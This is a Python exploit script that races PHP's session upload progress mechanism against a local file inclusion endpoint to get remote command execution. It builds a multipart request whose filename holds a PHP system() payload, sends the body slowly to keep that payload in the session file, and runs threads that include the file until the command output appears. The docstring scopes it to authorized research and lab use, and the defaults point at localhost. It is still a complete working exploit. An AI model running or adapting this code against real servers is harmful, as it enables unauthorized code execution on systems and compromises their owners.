#!/usr/bin/env python3
"""
Chain 1 Race Variant: Session Injection + LFI with cleanup=On

When session.upload_progress.cleanup = On (the production default), PHP
wipes the progress data from the session file after the upload completes.
The payload exists only during the upload processing window.

Strategy:
  1. Declare a large Content-Length but send the body slowly (slow-drip)
  2. PHP writes progress data as soon as it parses the multipart header
  3. The payload lives in the session file while we trickle the body
  4. Concurrent LFI threads hammer the session file to catch it mid-lifecycle

Requires: fastcgi_request_buffering off (nginx) or direct PHP (mod_php,
built-in server) to prevent the reverse proxy from buffering the entire
request before forwarding it to PHP.

NOTE: This is the 2018 Orange Tsai technique, not the novel CVE UAF.
For authorized security research and local lab use only.
"""

import argparse
import socket
import sys
import threading
import time
import urllib.request
import urllib.error


def build_parts(boundary, upload_path, cmd):
    payload = f"<?php echo '---RCE-START---'; system('{cmd}'); echo '---RCE-END---'; ?>"

    head = b""
    head += f"--{boundary}\r\n".encode()
    head += b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
    head += b"rce\r\n"
    head += f"--{boundary}\r\n".encode()
    head += f'Content-Disposition: form-data; name="file"; filename="{payload}"\r\n'.encode()
    head += b"Content-Type: application/octet-stream\r\n\r\n"

    tail = f"\r\n--{boundary}--\r\n".encode()
    return head, tail


def slow_inject(host, port, upload_path, session_id, cmd, stop_event,
                padding_size, drip_chunk, drip_delay):
    boundary = "----php2shellRace"
    head, tail = build_parts(boundary, upload_path, cmd)
    padding_needed = padding_size - len(head) - len(tail)
    if padding_needed < 1024:
        padding_needed = 1024
    total_body_len = len(head) + padding_needed + len(tail)

    req_head = f"POST {upload_path} HTTP/1.1\r\n".encode()
    req_head += f"Host: {host}:{port}\r\n".encode()
    req_head += f"Cookie: PHPSESSID={session_id}\r\n".encode()
    req_head += f"Content-Type: multipart/form-data; boundary={boundary}\r\n".encode()
    req_head += f"Content-Length: {total_body_len}\r\n".encode()
    req_head += b"Connection: close\r\n\r\n"

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(30)
        sock.connect((host, port))
        sock.sendall(req_head + head)

        sent = 0
        while sent < padding_needed and not stop_event.is_set():
            chunk = min(drip_chunk, padding_needed - sent)
            sock.sendall(b"B" * chunk)
            sent += chunk
            time.sleep(drip_delay)

        sock.sendall(tail)
        sock.recv(4096)
        sock.close()
    except Exception:
        pass


def lfi_hammer(host, port, lfi_path, session_file, stop_event, results):
    url = f"http://{host}:{port}{lfi_path}?page={session_file}"
    while not stop_event.is_set():
        try:
            resp = urllib.request.urlopen(url, timeout=2)
            body = resp.read().decode(errors="replace")
            if "---RCE-START---" in body:
                start = body.find("---RCE-START---") + 15
                end = body.find("---RCE-END---")
                if end > start:
                    results.append(body[start:end].strip())
                    stop_event.set()
                    return
        except Exception:
            pass
        time.sleep(0.001)


def main():
    ap = argparse.ArgumentParser(
        description="Chain 1 race variant: session injection + LFI (cleanup=On)")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8898)
    ap.add_argument("--lfi-path", default="/vuln_lfi.php")
    ap.add_argument("--upload-path", default="/index.php")
    ap.add_argument("--session-id", default="php2shell-race")
    ap.add_argument("--session-save-path", default="/tmp")
    ap.add_argument("--threads", type=int, default=5,
                    help="Number of concurrent LFI threads (default: 5)")
    ap.add_argument("--padding", type=int, default=262144,
                    help="Padding size in bytes to slow-drip (default: 256KB)")
    ap.add_argument("--drip-chunk", type=int, default=512,
                    help="Bytes per drip chunk (default: 512)")
    ap.add_argument("--drip-delay", type=float, default=0.02,
                    help="Seconds between drip chunks (default: 0.02)")
    ap.add_argument("cmd", nargs="?", default="id",
                    help="Command to execute (default: id)")
    args = ap.parse_args()

    session_file = f"{args.session_save_path}/sess_{args.session_id}"

    print("=" * 60)
    print("Chain 1 Race: Session Injection + LFI (cleanup=On)")
    print("=" * 60)
    print()
    print(f"  Target:       http://{args.host}:{args.port}")
    print(f"  Session ID:   {args.session_id}")
    print(f"  Session file: {session_file}")
    print(f"  Command:      {args.cmd}")
    print(f"  Padding:      {args.padding} bytes @ {args.drip_chunk}B/{args.drip_delay}s")
    print(f"  LFI threads:  {args.threads}")
    print()

    stop_event = threading.Event()
    results = []

    lfi_threads = []
    for _ in range(args.threads):
        t = threading.Thread(target=lfi_hammer, daemon=True,
                             args=(args.host, args.port, args.lfi_path,
                                   session_file, stop_event, results))
        lfi_threads.append(t)

    print("[+] Starting LFI threads...")
    for t in lfi_threads:
        t.start()

    print("[+] Sending slow-drip injection...")
    inject_thread = threading.Thread(target=slow_inject, daemon=True,
                                     args=(args.host, args.port, args.upload_path,
                                           args.session_id, args.cmd, stop_event,
                                           args.padding, args.drip_chunk,
                                           args.drip_delay))
    inject_thread.start()

    inject_thread.join(timeout=20)
    stop_event.set()

    for t in lfi_threads:
        t.join(timeout=2)

    print()
    if results:
        print(f"[+] Won the race! Output:")
        print(f"    {results[0]}")
        return 0
    else:
        print("[-] Did not win the race in this run.")
        print("    Possible causes:")
        print("    - fastcgi_request_buffering is on (must be off for nginx)")
        print("    - Try increasing --padding or --drip-delay")
        print("    - Run again (race is probabilistic)")
        return 1


if __name__ == "__main__":
    sys.exit(main())
